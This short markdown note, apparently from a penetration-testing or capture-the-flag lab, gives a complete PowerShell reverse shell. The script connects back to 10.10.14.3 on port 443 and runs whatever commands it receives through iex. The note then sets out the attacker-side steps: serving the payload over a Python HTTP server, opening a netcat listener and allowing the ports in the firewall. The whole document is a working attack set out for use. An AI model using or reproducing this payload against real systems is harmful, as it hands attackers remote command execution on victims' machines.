# UP A FILE SERVER

to create the payload in your machine to pass to the server

this powershell code will get a RCE

- save this in a file *shell.ps1*

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```markdown
# Up a webserver in the host to hospedate the file with python
> python3 -m http.server 80

# Start a NETCAT listener
> nc -lvnp 443

# Allow reverse 80 - 443 port connection on the host
> ufw allow from 10.10.10.27 proto tcp to any port 80,443
```